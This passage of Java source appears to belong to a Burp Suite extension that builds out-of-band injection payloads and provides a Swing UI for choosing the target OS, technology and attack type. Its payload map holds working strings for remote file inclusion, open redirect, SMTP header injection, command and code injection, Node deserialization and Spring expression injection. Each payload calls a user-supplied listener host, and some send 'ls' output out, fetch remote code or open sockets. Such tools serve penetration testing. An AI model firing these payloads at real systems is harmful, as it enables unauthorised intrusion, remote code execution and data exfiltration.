				 RawPayloads.put("701. "+payload_details_Attack_RFI+", "+payload_details_Scope_All+", "+payload_details_Technology_JAVA+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"http://Muzzy_Colaborator_All/muzzyRN.php.php");
//				 
//				 // Open Redirection
//				 
				 RawPayloads.put("801. "+payload_details_Attack_OR+", "+payload_details_Scope_All+", "+payload_details_Technology_JAVA+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"muzzyRN.Muzzy_Colaborator_All");
				 RawPayloads.put("802. "+payload_details_Attack_OR+", "+payload_details_Scope_All+", "+payload_details_Technology_JAVA+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"//muzzyRN.Muzzy_Colaborator_All");
				 RawPayloads.put("803. "+payload_details_Attack_OR+", "+payload_details_Scope_All+", "+payload_details_Technology_JAVA+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"%09.muzzyRN.Muzzy_Colaborator_All");
				 RawPayloads.put("804. "+payload_details_Attack_OR+", "+payload_details_Scope_All+", "+payload_details_Technology_JAVA+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"%252e.muzzyRN.Muzzy_Colaborator_All");
				 RawPayloads.put("805. "+payload_details_Attack_OR+", "+payload_details_Scope_All+", "+payload_details_Technology_JAVA+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"https:muzzyRN.Muzzy_Colaborator_All");
				 RawPayloads.put("806. "+payload_details_Attack_OR+", "+payload_details_Scope_All+", "+payload_details_Technology_JAVA+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"http://muzzyRN.Muzzy_Colaborator_All");
				 RawPayloads.put("807. "+payload_details_Attack_OR+", "+payload_details_Scope_All+", "+payload_details_Technology_JAVA+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"www.muzzyRN.Muzzy_Colaborator_All");
				 RawPayloads.put("808. "+payload_details_Attack_OR+", "+payload_details_Scope_Intranet+", "+payload_details_Technology_JAVA+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"@Muzzy_Colaborator_All");
				 RawPayloads.put("809. "+payload_details_Attack_OR+", "+payload_details_Scope_All+", "+payload_details_Technology_JAVA+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"@muzzyRN.Muzzy_Colaborator_All");
//				 
//				 // Simple Mail Transfer Protocol
//				 
				 RawPayloads.put("901. "+payload_details_Attack_SMTP+", "+payload_details_Scope_Internet+", "+payload_details_Technology_JAVA+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"%0d%0aBCC%3amuzzyRN@Muzzy_Colaborator_All%0d%0adxo%3a%20w");
				 RawPayloads.put("902. "+payload_details_Attack_SMTP+", "+payload_details_Scope_Internet+", "+payload_details_Technology_JAVA+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"%3e%0d%0aBCC%3amuzzyRN@Muzzy_Colaborator_All%0d%0ajqw%3a%20h");
				 RawPayloads.put("903. "+payload_details_Attack_SMTP+", "+payload_details_Scope_Internet+", "+payload_details_Technology_JAVA+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"muzzyRN@Muzzy_Colaborator_All%250aCc%3AmuzzyRN@Muzzy_Colaborator_All");
				 RawPayloads.put("904. "+payload_details_Attack_SMTP+", "+payload_details_Scope_Internet+", "+payload_details_Technology_JAVA+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"muzzyRN@Muzzy_Colaborator_All%250d%250aCc%3AmuzzyRN@Muzzy_Colaborator_All");
				 RawPayloads.put("905. "+payload_details_Attack_SMTP+", "+payload_details_Scope_Internet+", "+payload_details_Technology_JAVA+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"muzzyRN@Muzzy_Colaborator_All%250aBcc%3AmuzzyRN@Muzzy_Colaborator_All");
				 RawPayloads.put("906. "+payload_details_Attack_SMTP+", "+payload_details_Scope_Internet+", "+payload_details_Technology_JAVA+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"muzzyRN@Muzzy_Colaborator_All%250d%250aBcc%3AmuzzyRN@Muzzy_Colaborator_All");
				 RawPayloads.put("907. "+payload_details_Attack_SMTP+", "+payload_details_Scope_Internet+", "+payload_details_Technology_JAVA+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"%250aDATA%250afoo%250a%252e%250aMAIL+FROM%3A+muzzyRN@Muzzy_Colaborator_All%250aRCPT+TO%3A+muzzyRN@Muzzy_Colaborator_All%250aDATA%250aFrom%3A+muzzyRN@Muzzy_Colaborator_All%250aTo%3A+muzzyRN@Muzzy_Colaborator_All%250aSubject%3A+tst%250afoo%250a%252e%250a");
				 RawPayloads.put("908. "+payload_details_Attack_SMTP+", "+payload_details_Scope_Internet+", "+payload_details_Technology_JAVA+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"%250d%250aDATA%250d%250afoo%250d%250a%252e%250d%250aMAIL+FROM%3A+muzzyRN@Muzzy_Colaborator_All%250d%250aRCPT+TO%3A+muzzyRN@Muzzy_Colaborator_All%250d%250aDATA%250d%250aFrom%3A+muzzyRN@Muzzy_Colaborator_All%250d%250aTo%3A+muzzyRN@Muzzy_Colaborator_All%250d%250aSubject%3A+test%250d%250afoo%250d%250a%252e%250d%250a");
				 RawPayloads.put("909. "+payload_details_Attack_SMTP+", "+payload_details_Scope_Internet+", "+payload_details_Technology_JAVA+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"muzzyRN@Muzzy_Colaborator_All");
//				 
//				 // Code Injection
//				 
				 RawPayloads.put("1101. "+payload_details_Attack_CodeI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"$(sleep 5; curl http://Muzzy_Colaborator_All/muzzyRN.php?$(ls))&");
				 RawPayloads.put("1102. "+payload_details_Attack_CodeI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"\\'$(sleep 5; curl http://Muzzy_Colaborator_All/muzzyRN.php?$(ls))\\\\'");
				 RawPayloads.put("1103. "+payload_details_Attack_CodeI+", "+payload_details_Scope_All+", "+payload_details_Technology_dotnet+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,";exec(\"wget Muzzy_Colaborator_All/muzzyRN\")//'");
				 RawPayloads.put("1104. "+payload_details_Attack_CodeI+", "+payload_details_Scope_All+", "+payload_details_Technology_dotnet+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"{${system\\nslookup muzzyRN.Muzzy_Colaborator_All`}}");
				 RawPayloads.put("1105. "+payload_details_Attack_CodeI+", "+payload_details_Scope_All+", "+payload_details_Technology_JAVA+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"${new%20java.lang.ProcessBuilder(new%20java.lang.String[]{\"nslookup\",\"muzzyRN.Muzzy_Colaborator_All\"}).start()}");
				 RawPayloads.put("1106. "+payload_details_Attack_CodeI+", "+payload_details_Scope_All+", "+payload_details_Technology_JAVA+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"${T(java.lang.Runtime).getRuntime().exec(\"ping muzzyRN.Muzzy_Colaborator_All\")}");
				 RawPayloads.put("1107. "+payload_details_Attack_CodeI+", "+payload_details_Scope_All+", "+payload_details_Technology_Python+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,".__class__.__mro__[1].__subclasses__()[74]('muzzyRN.Muzzy_Colaborator_All', 80).send(('HTTP/1.1 200 OK\\r\\n\\r\\n' + 'payload').encode())");
				 RawPayloads.put("1108. "+payload_details_Attack_CodeI+", "+payload_details_Scope_All+", "+payload_details_Technology_Python+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"'.__class__.__mro__[1].__subclasses__()[74]('muzzyRN.Muzzy_Colaborator_All', 80).send(('GET /?payload HTTP/1.1\\r\\nHost: muzzyRN.Muzzy_Colaborator_All\\r\\n\\r\\n').encode())");
				 RawPayloads.put("1109. "+payload_details_Attack_CodeI+", "+payload_details_Scope_All+", "+payload_details_Technology_Python+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"'.__class__.__mro__[1].__subclasses__()[74]('muzzyRN.Muzzy_Colaborator_All', 80).send(('POST / HTTP/1.1\\r\\nHost: <your-domain>.burpcollaborator.net\\r\\nContent-Length: 7\\r\\n\\r\\npayload').encode())");
				 RawPayloads.put("1110. "+payload_details_Attack_CodeI+", "+payload_details_Scope_All+", "+payload_details_Technology_Python+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"'.__class__.__mro__[1].__subclasses__()[74]('muzzyRN.Muzzy_Colaborator_All', 53).sendto(('payload').encode(), ('Muzzy_Colaborator_All', 53))");
				 RawPayloads.put("1111. "+payload_details_Attack_CodeI+", "+payload_details_Scope_All+", "+payload_details_Technology_JAVA+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"new System.Net.WebClient().DownloadString(\"http://Muzzy_Colaborator_All/muzzyRN.aspx\")");
				 RawPayloads.put("1112. "+payload_details_Attack_CodeI+", "+payload_details_Scope_All+", "+payload_details_Technology_JAVA+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"new System.Net.WebClient().UploadString(\"http://Muzzy_Colaborator_All/muzzyRN.ashx\", \"data\")");
				 RawPayloads.put("1113. "+payload_details_Attack_CodeI+", "+payload_details_Scope_All+", "+payload_details_Technology_JAVA+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"new System.Net.WebClient().DownloadData(\"http://Muzzy_Colaborator_All/muzzyRN.aspx\")");
				 RawPayloads.put("1114. "+payload_details_Attack_CodeI+", "+payload_details_Scope_All+", "+payload_details_Technology_JAVA+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"java.io.ObjectInputStream ois = new java.io.ObjectInputStream(new java.net.URL(\"http://Muzzy_Colaborator_All/muzzyRN.ser\").openStream()); ois.readObject(); ois.close();");
//				 
//				 // Deserialization
//				 
				 RawPayloads.put("1201. "+payload_details_Attack_CodeI+", "+payload_details_Scope_All+", "+payload_details_Technology_Node+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"_$$ND_FUNC$$_function (){require('child_process').exec('ping muzzyRN.Muzzy_Colaborator_All');}()");				 
//				 
//				 // Expression Language Injection
//				 
				 RawPayloads.put("1301. "+payload_details_Attack_ELI+", "+payload_details_Scope_All+", "+payload_details_Technology_JAVA+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"${T(java.lang.Runtime).getRuntime().exec('ping muzzyRN.Muzzy_Colaborator_All')}");
				 RawPayloads.put("1302. "+payload_details_Attack_ELI+", "+payload_details_Scope_All+", "+payload_details_Technology_JAVA+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"#{T(java.lang.Runtime).getRuntime().exec('ping muzzyRN.Muzzy_Colaborator_All')}");
				 RawPayloads.put("1303. "+payload_details_Attack_ELI+", "+payload_details_Scope_All+", "+payload_details_Technology_JAVA+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"${T(org.apache.commons.io.FileUtils).copyURLToFile(new java.net.URL(\"http://Muzzy_Colaborator_All/muzzyRN.txt\"), new java.io.File(\"/tmp/secretfile.txt\"))}");
				 
				 ArrayList<String> Payload_list_return = new ArrayList<String>();

				 for(int i=0;i<=Integer.valueOf(RawPayloads.size())-1;i++){  
					 Object firstKey = RawPayloads.keySet().toArray()[i];
					 Object valueForFirstKey = RawPayloads.get(firstKey);
					 if (firstKey.toString().toLowerCase().matches("(.*)"+attack_method_4.toLowerCase()+"(.*)")) {	 
					} else {
						continue;
					}
					 String final_payload = valueForFirstKey.toString().toLowerCase().replace("Muzzy_Colaborator_All".toLowerCase(), user_input_2);
					 final_payload = final_payload.toString().toLowerCase().replace("Muzzy_Colaborator_IP".toLowerCase(), user_input_2);
					 final_payload = final_payload.toString().toLowerCase().replace("Muzzy_Colaborator_Domain".toLowerCase(), user_input_2);				
					 if (
							 (firstKey.toString().toLowerCase().matches("(.*)intranet(.*)") & attack_type_1.toString().toLowerCase().matches("intranet(.*)"))
							 &
							 ( (firstKey.toString().toLowerCase().matches("(.*)"+target_os_3.toLowerCase()+"(.*)".toLowerCase()) )
								 &
								 (firstKey.toString().toLowerCase().matches("(.*)"+target_technology_5.toLowerCase()+"(.*)technology(.*)".toLowerCase()))
								 &
								 (firstKey.toString().toLowerCase().matches("(.*)"+ip_or_domain_6.toLowerCase()+"(.*)".toLowerCase())))
							 ) {
						 Payload_list_return.add(final_payload.toString());
						 Return_Payload_list.put(firstKey.toString(), final_payload.toString());
					} else if(
							(firstKey.toString().toLowerCase().matches("(.*)internet(.*)") & attack_type_1.toString().toLowerCase().matches("internet(.*)"))
							&
						(	 (firstKey.toString().toLowerCase().matches("(.*)"+target_os_3.toLowerCase()+"(.*)".toLowerCase()) )
							 &
							 (firstKey.toString().toLowerCase().matches("(.*)"+target_technology_5.toLowerCase()+"(.*)technology(.*)".toLowerCase()))
							 &
							 (firstKey.toString().toLowerCase().matches("(.*)"+ip_or_domain_6.toLowerCase()+"(.*)".toLowerCase())))
							){
						
						 Payload_list_return.add(final_payload.toString());
						 Return_Payload_list.put(firstKey.toString(), final_payload.toString());						 
					}
					else {
					}
				 }		 
		 return Return_Payload_list;
	   }
	 

	 private void load_layout_1(GroupLayout layout1) {
		 final PrintWriter stdout = new PrintWriter(callbacks.getStdout(), true);
			JLabel Input_Main_field = new JLabel(" Fill Below Fields:");
			Input_Main_field.setFont(new Font("monospaced", Font.BOLD, 17));
			JLabel Space_add_custom = new JLabel(" ");
			JLabel OOBCollaboratorLabel = new JLabel(" Listener Interface: ");
			OOBCollaboratorLabel.setFont(new Font("monospaced", Font.PLAIN, 14));
			final JTextField OOBCollaborator = new JTextField();
			OOBCollaborator.setMinimumSize(new Dimension(300, OOBCollaborator.getPreferredSize().height));
			OOBCollaborator.setMaximumSize(new Dimension(300, OOBCollaborator.getPreferredSize().height));
			OOBCollaborator.setVisible(true);
			OOBCollaborator.setFont(new Font("monospaced", Font.PLAIN, 14));
			
			JLabel AttackTypeLabel = new JLabel("                            Attack Type: ");
			AttackTypeLabel.setFont(new Font("monospaced", Font.PLAIN, 14));
			
			String[] httpMethodValues =  {"Internet Facing Application", "Intranet Network Application"};
			final JComboBox  AttackType = new JComboBox(httpMethodValues);
			AttackType.setVisible(true);
			AttackType.setSelectedIndex(0);
			AttackType.setFont(new Font("monospaced", Font.PLAIN, 14));
			AttackType.setForeground(Color.DARK_GRAY);
			AttackType.setBorder(BorderFactory.createEmptyBorder(1, 2, 1, 2));
			AttackType.setMinimumSize(new Dimension(300, AttackType.getPreferredSize().height));
			AttackType.setMaximumSize(new Dimension(300, AttackType.getPreferredSize().height));
			
			// Configuration settings
			JLabel Configuration_Main_field = new JLabel(" Additional Settings:");
			Configuration_Main_field.setFont(new Font("monospaced", Font.BOLD, 17));

			JLabel SelectOSLabel = new JLabel("  Select Target OS: ");
			SelectOSLabel.setFont(new Font("monospaced", Font.PLAIN, 14));
			String[] OSTypesValues =  {"ALL", "WINDOWS", "LINUX"};
			final JComboBox  OSTypesJBox = new JComboBox(OSTypesValues);
			OSTypesJBox.setVisible(true);
			OSTypesJBox.setSelectedIndex(0);
			OSTypesJBox.setFont(new Font("monospaced", Font.PLAIN, 14));
			OSTypesJBox.setForeground(Color.DARK_GRAY);
			OSTypesJBox.setMinimumSize(new Dimension(130, OSTypesJBox.getPreferredSize().height));
			OSTypesJBox.setMaximumSize(new Dimension(130, OSTypesJBox.getPreferredSize().height));
			
			JLabel SelectAttackLabel = new JLabel("  Select Attack Method: ");
			SelectAttackLabel.setFont(new Font("monospaced", Font.PLAIN, 14));
			String[] AttackTypesValues =  {"ALL", "SQL Injection", "Command Injection", "XML External Entity", "Server Side Template Injection", "Server Side Includes", "Server Side JavaScript Injection", "Deserialization", "Simple Mail Transfer Protocol Injection", "Code Injection", "Open Redirection", "Remote File Inclusion", "Expression Language Injection"};
			
			final JComboBox  AttackTypesJBox = new JComboBox(AttackTypesValues);
			AttackTypesJBox.setVisible(true);
			AttackTypesJBox.setSelectedIndex(0);
			AttackTypesJBox.setFont(new Font("monospaced", Font.PLAIN, 14));
			AttackTypesJBox.setForeground(Color.DARK_GRAY);
			AttackTypesJBox.setMinimumSize(new Dimension(300, AttackTypesJBox.getPreferredSize().height));
			AttackTypesJBox.setMaximumSize(new Dimension(300, AttackTypesJBox.getPreferredSize().height));
			
			JLabel SelectTechnologyLabel = new JLabel("  Select Target Technology: ");
			SelectTechnologyLabel.setFont(new Font("monospaced", Font.PLAIN, 14));
			String[] TechnologyTypesValues =  {"ALL", "Python", "Java", ".Net", "PHP", "NodeJS"};
			final JComboBox  TechnologyTypesJBox = new JComboBox(TechnologyTypesValues);
			TechnologyTypesJBox.setVisible(true);
			TechnologyTypesJBox.setSelectedIndex(0);
			TechnologyTypesJBox.setFont(new Font("monospaced", Font.PLAIN, 14));
			TechnologyTypesJBox.setForeground(Color.DARK_GRAY);
			TechnologyTypesJBox.setMinimumSize(new Dimension(130, TechnologyTypesJBox.getPreferredSize().height));
			TechnologyTypesJBox.setMaximumSize(new Dimension(130, TechnologyTypesJBox.getPreferredSize().height));
						
			JButton save_settings = new JButton("Save Settings");
			save_settings.setFont(new Font("monospaced", Font.PLAIN, 14));
			save_settings.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent e) {					
					User_Listener_Interface = OOBCollaborator.getText();
					Pattern Validate_user_input_ip_regex = Pattern.compile(
					        "^(([01]?\\d\\d?|2[0-4]\\d|25[0-5])\\.){3}([01]?\\d\\d?|2[0-4]\\d|25[0-5])$");
					String Validate_user_input_domain_regex = "^((?!-)[A-Za-z0-9-]" + "{1,63}(?<!-)\\.)" + "+[A-Za-z]{2,6}"; 
					Pattern Validate_user_input_domain = Pattern.compile(Validate_user_input_domain_regex); 
					if(Validate_user_input_ip_regex.matcher(User_Listener_Interface).matches()) {
						_6_ip_or_domain_payloadg = "HTTP";
					}
					else if(Validate_user_input_domain.matcher(User_Listener_Interface) != null) {
						_6_ip_or_domain_payloadg = "DNS";
					}
					else {							
						callbacks.issueAlert("Please enter valid interface");
					}
					_1_attack_type_payloadg = (String) AttackType.getSelectedItem();
					_2_User_input_payloadg = User_Listener_Interface;
					_3_target_os_payloadg=(String) OSTypesJBox.getSelectedItem();
					_4_attack_method_payloadg= (String)AttackTypesJBox.getSelectedItem();
					_5_target_technology_payloadg= (String)TechnologyTypesJBox.getSelectedItem();					
				}
			});
			
			layout1.setHorizontalGroup(layout1.createParallelGroup()
					.addGroup(layout1.createSequentialGroup().addComponent(Space_add_custom))
					.addGroup(layout1.createSequentialGroup().addComponent(Input_Main_field))
					.addGroup(layout1.createSequentialGroup().addComponent(Space_add_custom))
					.addGroup(layout1.createSequentialGroup().addComponent(OOBCollaboratorLabel)
							.addComponent(OOBCollaborator).addComponent(AttackTypeLabel)	
							.addComponent(AttackType))
					.addGroup(layout1.createSequentialGroup().addComponent(Space_add_custom))
					.addGroup(layout1.createSequentialGroup().addComponent(Configuration_Main_field))
					.addGroup(layout1.createSequentialGroup().addComponent(Space_add_custom))
					.addGroup(layout1.createSequentialGroup().addComponent(SelectOSLabel)
							.addComponent(OSTypesJBox))
					.addGroup(layout1.createSequentialGroup().addComponent(Space_add_custom))
					.addGroup(layout1.createSequentialGroup().addComponent(SelectTechnologyLabel)
							.addComponent(TechnologyTypesJBox))
					.addGroup(layout1.createSequentialGroup().addComponent(Space_add_custom))
					.addGroup(layout1.createSequentialGroup().addComponent(SelectAttackLabel)
							.addComponent(AttackTypesJBox))
					.addGroup(layout1.createSequentialGroup().addComponent(Space_add_custom))
					.addGroup(layout1.createSequentialGroup().addComponent(Space_add_custom))
					.addComponent(save_settings, GroupLayout.Alignment.CENTER)
					);
			
			layout1.setVerticalGroup(layout1.createSequentialGroup()
					.addGroup(layout1.createParallelGroup().addComponent(Space_add_custom))
					.addGroup(layout1.createParallelGroup().addComponent(Input_Main_field))
					.addGroup(layout1.createParallelGroup().addComponent(Space_add_custom))
					.addGroup(layout1.createParallelGroup().addComponent(OOBCollaboratorLabel)
							.addComponent(OOBCollaborator).addComponent(AttackTypeLabel)
							.addComponent(AttackType))
					.addGroup(layout1.createParallelGroup().addComponent(Space_add_custom))
					.addGroup(layout1.createParallelGroup().addComponent(Configuration_Main_field))
					.addGroup(layout1.createParallelGroup().addComponent(Space_add_custom))
					.addGroup(layout1.createParallelGroup().addComponent(SelectOSLabel)
							.addComponent(OSTypesJBox))
					.addGroup(layout1.createParallelGroup().addComponent(Space_add_custom))
					.addGroup(layout1.createParallelGroup().addComponent(SelectTechnologyLabel)
							.addComponent(TechnologyTypesJBox))
					.addGroup(layout1.createParallelGroup().addComponent(Space_add_custom))
					.addGroup(layout1.createParallelGroup().addComponent(SelectAttackLabel)
							.addComponent(AttackTypesJBox))
					.addGroup(layout1.createParallelGroup().addComponent(Space_add_custom))
					.addGroup(layout1.createParallelGroup().addComponent(Space_add_custom))
					.addGroup(layout1.createParallelGroup().addComponent(save_settings))
					);			
	 }
	 
	 
	 private void load_layout_2(GroupLayout layout2) {
			// 2nd Tab          ------------------ Payload List ------------------
		 final PrintWriter stdout = new PrintWriter(callbacks.getStdout(), true);
			JLabel Payload_List_Label = new JLabel(" Please enter the reference number:   ");
			Payload_List_Label.setFont(new Font("monospaced", Font.PLAIN, 14));

			JLabel Waste_line = new JLabel("   ");
			final JLabel Panel2_notification_Toast = new JLabel(" Alert:  ");
			
			JLabel PS_Muzzy_Number_Label_1 = 		new JLabel(" Reference Number  ");
			JLabel PS_URL_Label_2 = 				new JLabel(" URL   ");
			JLabel PS_Host_Label_3 = 				new JLabel(" Host   ");
			JLabel PS_Port_Label_4 = 				new JLabel(" Port   ");
			JLabel PS_Parameter_Label_5 = 			new JLabel(" Inserion Parameter  ");
			JLabel PS_Payload_Label_6 = 			new JLabel(" Payload      ");
			JLabel PS_Info_Label_7 = 				new JLabel(" Payload Info    ");
			JLabel PS_Response_Status_code_Label_8= new JLabel(" Response Status Code   ");
			
			final JLabel PS_Muzzy_Number_Value_1 = 		new JLabel("  -  ");
			final JLabel PS_URL_Value_2 = 				new JLabel("  -  ");
			final JLabel PS_Host_Value_3 = 				new JLabel("  -  ");
			final JLabel PS_Port_Value_4 = 				new JLabel("  -  ");
			final JLabel PS_Parameter_Value_5 = 			new JLabel("  -  ");
			final JLabel PS_Payload_Value_6 = 			new JLabel("  -  ");
			final JLabel PS_Info_Value_7 = 				new JLabel("  -  ");
			final JLabel PS_Response_Status_code_Value_8= new JLabel("  -  ");
			
			HashMap<Integer, JLabel> PS_List_of_Values = new HashMap<>() ;
			PS_List_of_Values.put(1, PS_Muzzy_Number_Value_1);
			PS_List_of_Values.put(2, PS_URL_Value_2);
			PS_List_of_Values.put(3, PS_Host_Value_3);
			PS_List_of_Values.put(4, PS_Port_Value_4);
			PS_List_of_Values.put(5, PS_Parameter_Value_5);
			PS_List_of_Values.put(6, PS_Payload_Value_6);
			PS_List_of_Values.put(7, PS_Info_Value_7 );
			PS_List_of_Values.put(8, PS_Response_Status_code_Value_8);
			
			HashMap<Integer, JLabel> PS_List_of_Lables = new HashMap<>() ;
			PS_List_of_Lables.put(1, PS_Muzzy_Number_Label_1);
			PS_List_of_Lables.put(2, PS_URL_Label_2);
			PS_List_of_Lables.put(3, PS_Host_Label_3);
			PS_List_of_Lables.put(4, PS_Port_Label_4);
			PS_List_of_Lables.put(5, PS_Parameter_Label_5);
			PS_List_of_Lables.put(6, PS_Payload_Label_6);
			PS_List_of_Lables.put(7, PS_Info_Label_7 );
			PS_List_of_Lables.put(8, PS_Response_Status_code_Label_8);

			try {
				for (int i = 1; i < 9; i++) {
					PS_List_of_Values.get(i).setFont(new Font("Serif", Font.PLAIN, 14));
				}
				for (int i = 1; i < 9; i++) {
					PS_List_of_Lables.get(i).setFont(new Font("Serif", Font.BOLD, 14));
					PS_List_of_Lables.get(i).setMinimumSize(new Dimension(200, PS_List_of_Lables.get(i).getPreferredSize().height));
					PS_List_of_Lables.get(i).setMaximumSize(new Dimension(200, PS_List_of_Lables.get(i).getPreferredSize().height));
				}					
			} catch (Exception e) {
			}
						
			final JTextField Filter_Search_Request = new JTextField();
			Filter_Search_Request.setMinimumSize(new Dimension(300, Filter_Search_Request.getPreferredSize().height));
			Filter_Search_Request.setMaximumSize(new Dimension(300, Filter_Search_Request.getPreferredSize().height));
			Filter_Search_Request.setVisible(true);
			Filter_Search_Request.setFont(new Font("monospaced", Font.PLAIN, 14));
			
			// Search Button
			JButton Search_button = new JButton("  Search  ");
			Search_button.setFont(new Font("monospaced", Font.PLAIN, 12));
			Search_button.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent e) {
					Integer User_search_MuzzyRN = 0;
					
					try { 
				        Integer.parseInt(Filter_Search_Request.getText()); 
				        User_search_MuzzyRN = Integer.valueOf (Filter_Search_Request.getText().trim());
				    } catch(NumberFormatException e3) { 
				    	 Panel2_notification_Toast.setText(" Alert:  Invalid Input || Please Enter Integer Numbers");
				    	return ; 
				    }
						Panel2_notification_Toast.setText(" Alert: ");
					 
					 if ((User_search_MuzzyRN > MuzzyRN) ||(User_search_MuzzyRN <= 786) || (Filter_Search_Request.getText().toString().trim().length() == 0)   ) {
						 Panel2_notification_Toast.setText(" Alert:  Invalid Payload Number || Please Enter Correct number");
						 return ;
					 }
						byte[] Logger_Muzzy_Request_Data = (byte[]) Logger_Muzzy_Req.get(User_search_MuzzyRN);
						String Logger_Muzzy_Description_Data = Logger_Muzzy_Info.get(User_search_MuzzyRN);						
						String[] arrOfStr = Logger_Muzzy_Description_Data.toString().split("muzzy-change-me");
						PS_Muzzy_Number_Value_1.setText(arrOfStr[0]);
						PS_URL_Value_2.setText(arrOfStr[1]);
						PS_Host_Value_3.setText(arrOfStr[2]);
						PS_Port_Value_4.setText(arrOfStr[3]);
						PS_Parameter_Value_5.setText(arrOfStr[4]);
						PS_Payload_Value_6.setText(arrOfStr[5]);
						PS_Info_Value_7.setText(arrOfStr[6]);
						PS_Response_Status_code_Value_8.setText(arrOfStr[7]);
				}
			});
			
			
			// Send Request To Repeater
			JButton SRTRepeater_button = new JButton("  Send Request to Repeater  ");
			SRTRepeater_button.setFont(new Font("monospaced", Font.PLAIN, 12));
			SRTRepeater_button.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent e) {
					byte[] Logger_Muzzy_Request_Data = (byte[]) Logger_Muzzy_Req.get(Integer.valueOf(PS_Muzzy_Number_Value_1.getText().toString().trim()));
					if (PS_Muzzy_Number_Value_1.getText().toString().trim() == "" & PS_Host_Value_3.getText().toString().trim() == "") {
						Panel2_notification_Toast.setText(" Alert: Please Search Correct Payload");
						return;
}
					boolean ishttpsorhttp = false;
					if (Integer.valueOf(PS_Port_Value_4.getText().toString().trim()) == 443) {
						ishttpsorhttp = true;
					}
					 callbacks.sendToRepeater(PS_Host_Value_3.getText().toString().trim(), Integer.valueOf(PS_Port_Value_4.getText().toString().trim()), ishttpsorhttp, Logger_Muzzy_Request_Data, "auto generated - "+PS_Muzzy_Number_Value_1.getText().toString().trim());

				}
			});

			
			layout2.setHorizontalGroup(layout2.createParallelGroup()
					.addGroup(layout2.createSequentialGroup().addComponent(Waste_line))
					.addGroup(layout2.createSequentialGroup()
							.addComponent(Payload_List_Label)
							.addComponent(Filter_Search_Request)
							.addComponent(Waste_line)
							.addComponent(Search_button))
					.addGroup(layout2.createSequentialGroup().addComponent(Waste_line))
					.addGroup(layout2.createSequentialGroup()
							.addComponent(PS_Muzzy_Number_Label_1)
							.addComponent(PS_Muzzy_Number_Value_1)
							)
					.addGroup(layout2.createSequentialGroup()
							.addComponent(PS_URL_Label_2)
							.addComponent(PS_URL_Value_2)
							)
					.addGroup(layout2.createSequentialGroup()
							.addComponent(PS_Host_Label_3)
							.addComponent(PS_Host_Value_3)
							)
					.addGroup(layout2.createSequentialGroup()
							.addComponent(PS_Port_Label_4)
							.addComponent(PS_Port_Value_4)
							)
					.addGroup(layout2.createSequentialGroup()
							.addComponent(PS_Parameter_Label_5)
							.addComponent(PS_Parameter_Value_5)
							)
					.addGroup(layout2.createSequentialGroup()
							.addComponent(PS_Payload_Label_6)
							.addComponent(PS_Payload_Value_6)
							)
					.addGroup(layout2.createSequentialGroup()
							.addComponent(PS_Info_Label_7)
							.addComponent(PS_Info_Value_7)
							)
					.addGroup(layout2.createSequentialGroup()
